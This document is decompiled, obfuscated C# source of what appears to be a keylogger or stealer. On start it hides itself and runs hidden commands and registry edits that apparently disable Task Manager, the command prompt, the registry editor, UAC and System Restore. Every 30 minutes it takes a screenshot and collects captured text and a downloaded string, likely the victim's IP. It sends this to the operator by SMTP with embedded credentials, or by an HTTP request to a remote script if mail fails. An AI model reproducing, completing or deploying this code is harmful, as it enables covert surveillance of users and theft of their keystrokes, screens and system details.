using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using ns0;
using ns1;
using ns5;
using ns6;

namespace ns2;

internal class Class5
{
	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static string string_11;

	public static string string_12 = "";

	public static string string_13 = Class16.smethod_57("hqewwLhVdIu5sJSirL64l6Gvu7KMbsDArVOtsCQ=", "False");

	public static string string_14 = Class16.smethod_57("bo6Ql4h+j6ChjHGPnZZ2VXF8JA==", "False");

	public static string string_15 = Class16.smethod_57("ma7Aw3ONrq28sVSku8Ak", "False");

	public static int int_0 = 587;

	public static string string_16 = Class16.smethod_57("USERTASK", "False");

	public static string string_17 = Class16.smethod_57("USERCMD", "False");

	public static string string_18 = Class16.smethod_57("USERREG", "False");

	public static string string_19 = Class16.smethod_57("USERUAC", "False");

	public static string string_20 = Class16.smethod_57("USERFOLDER", "False");

	public static string string_21 = Class16.smethod_57("USERCONTROL", "False");

	public static string string_22 = Class16.smethod_57("USERRESTORE", "False");

	public static string string_23 = Class16.smethod_57("DLEXSite", "False");

	public static string string_24 = Class16.smethod_57("jLO+wX1TbiQ=", "False");

	public static string string_25 = Class16.smethod_57("JA==", "False");

	public static string string_26 = Class16.smethod_57("aLC7v7RdXnnIclNugohzUyQ=", "False");

	public static string string_27 = Class16.smethod_57("fKm5trOcs2ulqZe2tLWpmGCuwbmRpGvAs5lgt8GliWCYpYdYcnmWkHFuayQ=", "False");

	public static string string_28 = Class16.smethod_57("erPBuCQ=", "False");

	public static string string_29 = Class16.smethod_57("cKa8yq4c", "False");

	public static int int_1 = 1800000;

	public static string string_30 = "";

	public static string string_31 = "";

	public static int int_2 = 0;

	public static Class9 class9_0;

	public static Thread thread_0 = new Thread(smethod_0);

	public static Thread thread_1 = new Thread((ThreadStart)Class16.smethod_43);

	public static Thread thread_2 = new Thread((ThreadStart)Class16.smethod_10);

	public static Thread thread_3 = new Thread((ThreadStart)Class16.smethod_62);

	[STAThread]
	public static void Main()
	{
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(5000);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)Class2.smethod_0()).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_3.IsBackground = true;
			thread_3.Start();
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				class9_0 = new Class9(string_31);
				Class16.smethod_36();
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			thread_0.IsBackground = true;
			thread_0.Start();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_1.IsBackground = true;
			thread_1.Start();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class12.Class13 class13_ = new Class12.Class13();
			Class16.smethod_53(class13_);
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Class10.Class11();
			Class16.smethod_22();
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(string_16, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class16.smethod_57("cY+Ur6dsmaGojXeYrqubbparqbePuMa3uo6gnL+rm7PCxa6doKa/to2zxsmkbLnByK2XuKW7upytvsSkebO7v6uSqcKym6K3w7u1HQ==", "False"), Class16.smethod_57("hcXaz8KtwbvP06ypzuAJ", "False"), (object)Class16.smethod_57("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_17, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class16.smethod_57("ZoSJpJxhjpadgmyNo6CQY4ugnqyErbusr4OVlLqph5ytsLB6hq2ur42ss7GxepCtuaGNsLenkJesuLCqKA==", "False"), Class16.smethod_57("c7PIvbCbr5ipkhc=", "False"), (object)Class16.smethod_57("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_18, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class16.smethod_57("h6Wqxb2Cr7e+o42uxMGxhKzBv82lztzN0KS2stXBscnY28SztrzVzKPJ3N+6gs/X3sOtzrvR0LLD1Nq6j8nR1cGov9jIsbjN2dHLBw==", "False"), Class16.smethod_57("a6vAtaiTp5+5rZC1wca/e7G8wLkf", "False"), (object)Class16.smethod_57("TCw=", "False"), RegistryValueKind.DWord);
			}
			if (Operators.CompareString(string_19, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class16.smethod_57("ipzJy8+1xtzr2aO15ufarM+gpsKqz9Giy7/HjaPRZ4fk3dSry9+Zwprb4OjLtJWf0NisyZvZ3qyCrriqZ6q4wLOjtby6up6jv7nClMvQ5tW60dPowp7L29jVvtXJt9u51NLi2p3H3+fPttDJxNWzy9Ddy7q+wO3Zu8falJW9grLix6nO0sC7iIKc6IaZp7TTqp6xv7iGdsaNpIZ2yAE=", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(string_20, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class16.smethod_57("cH6La56CnWSTiGGOoJ6shK27rK+DlZG0oJCot7qjkpWbtKuCqLu+mWGutr2ijK2asK+RorO5mW6osLSgh563p4KWqbC6r4OrZHqzPoezkayKnam9jI6trbqrkVlzv11wfouqgXWIlo9dTZ1kfF1Nnyo=", "False"), (AppWinStyle)2, false, -1);
			}
			if (Operators.CompareString(string_21, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				Interaction.Shell(Class16.smethod_57("a3mGZpl9mF+Og1yJm5mnf6i2p6p+kIyvm4ujsrWejZCWr6Z9o7a5lFypsbidh6iVq6qMna60lGmjq6+bgpmyon2RpKu1qn6mX3WuOYKuiaeHqLG1pGmVraukOWOzZopee56Kj2iGg2ZnfVRwZmd/Lg==", "False"), (AppWinStyle)0, false, -1);
			}
			if (Operators.CompareString(string_22, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
			{
				((ServerComputer)Class2.smethod_0()).get_Registry().SetValue(Class16.smethod_57("h6Wqxb2Lqaitqp6npq+miKiqyLGOoLnDn5GfwbnHoszU382lzsHDx62+1OPRX6i5yKG0zNfRzLOwyt7RqMnTyLG4zdnRy5G/2ODNsb8J", "False"), Class16.smethod_57("jc3i18q1ycLIAQ==", "False"), (object)Class16.smethod_57("TCw=", "False"), RegistryValueKind.DWord);
			}
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_2.IsBackground = true;
			thread_2.Start();
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void smethod_0()
	{
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(int_1);
				text = "";
				string text2 = "";
				double double_ = 0.2;
				Class16.smethod_25(ref double_);
				try
				{
					WebClient webClient = new WebClient();
					text2 = Class16.smethod_57("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(Class16.smethod_57("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + Class16.smethod_57("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				double_ = 1.0;
				Class16.smethod_25(ref double_);
				try
				{
					if (Operators.CompareString(string_28, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class16.smethod_57("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				double_ = 0.3;
				Class16.smethod_25(ref double_);
				try
				{
					if (Operators.CompareString(string_31, "", false) != 0)
					{
						string_30 = Class16.smethod_57("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + string_31 + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(string_13);
							mailMessage2.To.Add(string_13);
							mailMessage2.Subject = Class16.smethod_57("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class16.smethod_57("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = string_30;
							try
							{
								if (Operators.CompareString(string_28, Class16.smethod_57("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class16.smethod_57("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_2 + Class16.smethod_57("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(string_15);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = int_0;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(string_13, string_14);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = Class16.smethod_57("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + string_13 + "&subject=" + Strings.Replace(Class16.smethod_57("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class16.smethod_57("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(string_30, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + string_13).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				string_30 = "";
				string_31 = "";
				string_12 = "";
				int_2++;
			}
		}
	}
}
